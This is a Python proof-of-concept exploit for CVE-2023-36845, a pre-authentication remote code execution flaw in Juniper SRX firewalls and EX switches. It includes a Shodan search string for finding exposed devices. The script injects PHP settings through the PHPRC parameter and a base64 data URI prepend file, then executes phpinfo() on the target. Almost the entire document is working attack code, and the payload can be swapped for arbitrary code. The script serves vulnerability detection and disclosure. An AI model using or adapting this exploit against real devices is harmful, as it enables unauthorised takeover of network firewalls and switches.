# ***************************************************************************************************
# Exploit Title: juniper-SRX-Firewalls&EX-switches (PreAuth-RCE) (PoC)
# Description:
#
# This code serves as both a vulnerability detector and a proof of concept for CVE-2023-36845.
# It executes the phpinfo() function on the login page of the target device,
# allowing to inspect the PHP configuration. also this script has the option to save the phpinfo()
# output to a file for further analysis.
#
# Shodan Dork: http.favicon.hash:2141724739
# Date: 2023/10/01
# Exploit Author: whiteOwl (whiteowl.pub@gmail.com)
# Vendor Homepage: https://whiteowl-pub.github.io
# Version: Versions Prior to 20.4R3-S9,21.1R1,21.2R3-S7,21.3R3-S5,
#          21.4R3-S5,22.1R3-S4,22.2R3-S2,22.3R2-S2/R3-S1,22.
#          4R2-S1/R3,23.2R1-S1/R2
# Tested on: JUNOS SM804122pri 15.1X49-D170.4
# CVE : cve-2023-36845
# ***************************************************************************************************

import argparse
import requests

banner = """
*************************************************************
* CVE-2023-36845 Vulnerability Detector & Proof of concept  *
* This script checks for the CVE-2023-36845 vulnerability   *
* and run phpinfo() on vulnerable devices.                  *
* If you suspect a vulnerable system, please take action    *
* immediately to secure it.                                 *
*                                                           *
* Author: whiteowl                                          *
*************************************************************
"""

def send_request(url, output_file=None, verbose=False):
    target_url = f"{url}/?PHPRC=/dev/fd/0"
    data = 'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'

    headers = {
        'User-Agent': 'Mozilla/5.0',
    }

    try:
        response = requests.post(target_url, headers=headers, data=data, stream=True)
        if response.status_code == 200:
            print("The Target Device is Vulnerable to: CVE-2023-36845")
        else:
            print("Not Vulnerable: Status Code", response.status_code)

        if output_file:
            with open(output_file, 'w', encoding='utf-8') as file:
                file.write(response.text)

        if verbose:
            print(f"HTTP Status Code: {response.status_code}")
            print("Response Headers:")
            for header, value in response.headers.items():
                print(f"{header}: {value}")
            print("Response Content:")
            print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def main():
    print(banner)
    parser = argparse.ArgumentParser(description="Custom curl-like script")
    parser.add_argument("-u", "--url", required=True, help="URL to send the HTTP request")
    parser.add_argument("-o", "--output", help="Output file to save the HTML content")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")

    args = parser.parse_args()
    send_request(args.url, args.output, args.verbose)

if __name__ == "__main__":
    main()